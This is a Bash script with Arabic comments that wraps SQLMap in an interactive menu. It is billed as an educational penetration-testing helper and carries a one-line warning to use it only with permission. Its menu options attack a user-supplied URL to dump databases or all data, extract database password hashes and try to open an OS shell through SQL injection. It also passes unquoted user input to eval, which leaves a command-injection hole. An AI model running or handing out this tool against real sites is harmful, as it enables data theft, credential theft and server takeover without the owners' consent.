#!/bin/bash

# ============================================================
#  SQLMap Auto – أتمتة أوامر SQLMap بواجهة تفاعلية نظيفة
#  الإصدار: 1.0
#  الاستخدام: ./sqlmap_auto.sh
#  المتطلبات: sqlmap مثبت على النظام (Kali Linux افتراضياً)
# ============================================================

# إعدادات الألوان
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# متغيرات عامة
TARGET=""
COOKIE=""
OUTPUT_DIR="sqlmap_results"
LEVEL=1
RISK=1

# دالة عرض الشعار
show_banner() {
    clear
    echo -e "${PURPLE}"
    echo "   ███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ "
    echo "   ██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗"
    echo "   ███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝"
    echo "   ╚════██║██║   ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝ "
    echo "   ███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║     "
    echo "   ╚══════╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     "
    echo -e "${NC}"
    echo -e "${CYAN}   أداة أتمتة أوامر SQLMap – اختبار الاختراق التعليمي${NC}"
    echo -e "${YELLOW}   استخدم فقط على أنظمة تملك إذن اختبارها!${NC}"
    echo
}

# دالة التحقق من وجود sqlmap
check_sqlmap() {
    if ! command -v sqlmap &> /dev/null; then
        echo -e "${RED}[-] sqlmap غير مثبت!${NC}"
        echo -e "قم بتثبيته: sudo apt install sqlmap"
        exit 1
    fi
}

# دالة إدخال الرابط
set_target() {
    echo -e "${BLUE}[>] أدخل الرابط المستهدف (URL):${NC}"
    read -p "> " TARGET
    if [ -z "$TARGET" ]; then
        echo -e "${RED}[-] الرابط فارغ!${NC}"
        sleep 2
        return 1
    fi
    echo -e "${GREEN}[✓] تم تعيين الهدف: $TARGET${NC}"
    # سؤال عن الكوكيز إذا لزم الأمر
    read -p "هل تريد إدخال كوكيز (اختياري)؟ [y/N]: " answer
    if [[ "$answer" =~ ^[Yy]$ ]]; then
        read -p "أدخل قيمة الكوكي (مثال: PHPSESSID=...): " COOKIE
        echo -e "${GREEN}[✓] تم تعيين الكوكي: $COOKIE${NC}"
    fi
    sleep 1
}

# دالة إعداد المستوى والمخاطرة
set_level_risk() {
    echo -e "${BLUE}[>] اختر مستوى الفحص (Level 1-5) والخطورة (Risk 1-3):${NC}"
    echo -e "   ${CYAN}1) مستوى 1 - خطر 1 (أساسي وسريع)${NC}"
    echo -e "   ${CYAN}2) مستوى 3 - خطر 2 (متوازن)${NC}"
    echo -e "   ${CYAN}3) مستوى 5 - خطر 3 (أقصى دقة، أبطأ)${NC}"
    read -p "اختر [1/2/3]: " lr_choice
    case $lr_choice in
        1) LEVEL=1; RISK=1 ;;
        2) LEVEL=3; RISK=2 ;;
        3) LEVEL=5; RISK=3 ;;
        *) LEVEL=1; RISK=1 ;;
    esac
    echo -e "${GREEN}[✓] سيتم استخدام Level=$LEVEL, Risk=$RISK${NC}"
}

# دالة تنفيذ أمر sqlmap مع خيارات مشتركة
run_sqlmap() {
    local extra_args="$@"
    local cmd="sqlmap -u \"$TARGET\" --batch --level=$LEVEL --risk=$RISK --output-dir=\"$OUTPUT_DIR\""
    # إضافة الكوكي إذا وجد
    if [ -n "$COOKIE" ]; then
        cmd+=" --cookie=\"$COOKIE\""
    fi
    # إضافة الحجج الإضافية
    cmd+=" $extra_args"

    echo -e "${CYAN}[*] الأمر المنفذ:${NC}"
    echo -e "${WHITE}    $cmd${NC}"
    echo -e "${CYAN}[*] بدء التنفيذ...${NC}"
    eval "$cmd"
    echo -e "${GREEN}[✓] اكتمل التنفيذ. النتائج محفوظة في $OUTPUT_DIR${NC}"
    read -p "اضغط Enter للمتابعة..."
}

# القائمة الرئيسية
main_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}=== القائمة الرئيسية ===${NC}"
        echo -e "   ${WHITE}[1]${NC} تعيين الهدف (URL)"
        echo -e "   ${WHITE}[2]${NC} إعدادات المستوى والخطورة"
        if [ -n "$TARGET" ]; then
            echo -e "${GREEN}   [الهدف: $TARGET]${NC}"
        else
            echo -e "${YELLOW}   [لم يتم تحديد هدف بعد]${NC}"
        fi
        echo
        echo -e "${BLUE}=== أوامر SQLMap ===${NC}"
        echo -e "   ${WHITE}[3]${NC} فحص أساسي للثغرة (Basic Detection)"
        echo -e "   ${WHITE}[4]${NC} سرد قواعد البيانات (--dbs)"
        echo -e "   ${WHITE}[5]${NC} سرد الجداول في قاعدة بيانات محددة"
        echo -e "   ${WHITE}[6]${NC} تفريغ بيانات جدول (مثل: users)"
        echo -e "   ${WHITE}[7]${NC} تفريغ كل البيانات (--dump-all)"
        echo -e "   ${WHITE}[8]${NC} معرفة قاعدة البيانات الحالية (--current-db)"
        echo -e "   ${WHITE}[9]${NC} معرفة المستخدم الحالي (--current-user)"
        echo -e "   ${WHITE}[10]${NC} محاولة الحصول على شل (--os-shell)"
        echo -e "   ${WHITE}[11]${NC} استخراج كلمات المرور (--passwords)"
        echo -e "   ${WHITE}[12]${NC} فحص شامل متقدم (Level 5 Risk 3)"
        echo
        echo -e "${BLUE}=== أدوات مساعدة ===${NC}"
        echo -e "   ${WHITE}[13]${NC} حذف ملفات النتائج السابقة"
        echo -e "   ${WHITE}[0]${NC} خروج"
        echo
        read -p "اختر رقم القائمة: " choice

        case $choice in
            0) echo -e "${GREEN}وداعاً!${NC}"; exit 0 ;;
            1) set_target ;;
            2) set_level_risk ;;
            3) run_sqlmap "--technique=BEUST" ;; # فحص شامل سريع
            4) run_sqlmap "--dbs" ;;
            5) 
                if [ -z "$TARGET" ]; then echo -e "${RED}حدد الهدف أولاً!${NC}"; sleep 2; continue; fi
                echo -e "${BLUE}أدخل اسم قاعدة البيانات (مثال library_db):${NC}"
                read -p "> " db
                run_sqlmap "-D $db --tables"
                ;;
            6)
                if [ -z "$TARGET" ]; then echo -e "${RED}حدد الهدف أولاً!${NC}"; sleep 2; continue; fi
                echo -e "${BLUE}أدخل اسم قاعدة البيانات (مثال library_db):${NC}"
                read -p "> " db
                echo -e "${BLUE}أدخل اسم الجدول (مثال users):${NC}"
                read -p "> " table
                run_sqlmap "-D $db -T $table --dump"
                ;;
            7) run_sqlmap "--dump-all" ;;
            8) run_sqlmap "--current-db" ;;
            9) run_sqlmap "--current-user" ;;
            10) run_sqlmap "--os-shell" ;;
            11) run_sqlmap "--passwords" ;;
            12) 
                LEVEL=5; RISK=3
                run_sqlmap "--dbs --tables --dump --batch"
                ;;
            13)
                echo -e "${YELLOW}سيتم حذف مجلد $OUTPUT_DIR بالكامل...${NC}"
                rm -rf "$OUTPUT_DIR"
                echo -e "${GREEN}[✓] تم الحذف${NC}"
                sleep 1
                ;;
            *) echo -e "${RED}اختيار غير صحيح!${NC}"; sleep 1 ;;
        esac
    done
}

# نقطة البداية
check_sqlmap
mkdir -p "$OUTPUT_DIR"
main_menu